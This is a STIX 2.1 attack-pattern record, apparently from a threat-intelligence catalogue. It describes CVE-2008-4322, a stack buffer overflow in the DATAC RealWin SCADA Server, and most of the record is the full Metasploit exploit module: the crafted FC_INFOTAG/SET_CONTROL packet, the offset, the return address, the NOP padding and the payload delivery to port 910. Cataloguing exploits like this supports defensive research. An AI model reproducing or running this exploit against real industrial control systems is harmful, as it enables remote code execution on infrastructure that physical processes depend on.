{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d9da4e69-1bd7-430e-9073-db2f14c9a6f9",
    "created": "2024-08-14T16:39:27.37299Z",
    "modified": "2024-08-14T16:39:27.372994Z",
    "name": "DATAC RealWin SCADA Server Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in DATAC Control International RealWin SCADA Server 2.0 (Build 6.0.10.37). By sending a specially crafted FC_INFOTAG/SET_CONTROL packet an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/realwin.rb",
            "external_id": "realwin.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4322"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DATAC RealWin SCADA Server Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in DATAC Control\n        International RealWin SCADA Server 2.0 (Build 6.0.10.37).\n        By sending a specially crafted FC_INFOTAG/SET_CONTROL packet,\n        an attacker may be able to execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-4322' ],\n          [ 'OSVDB', '48606' ],\n          [ 'BID', '31418' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 550,\n          'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Universal', { 'Offset' => 740, 'Ret' => 0x4001e2a9 } ], # Thanks Jacopo!\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2008-09-26'))\n\n    register_options([Opt::RPORT(910)])\n  end\n\n  def exploit\n    connect\n\n    data =  [0x67542310].pack('V')\n    data << [0x00000800].pack('V')\n    data << [0x000a77e3].pack('V')\n    data << [0x00040005].pack('V')\n    data << \"\\x00\\x00\"\n    data << make_nops(target['Offset'])\n    data << [target.ret].pack('V')\n    data << [0x00404040].pack('V')\n    data << payload.encoded\n    data << make_nops(1024)\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.get_once\n    sock.put(data)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-09-26",
    "x_mitre_platforms": [
        "win'"
    ]
}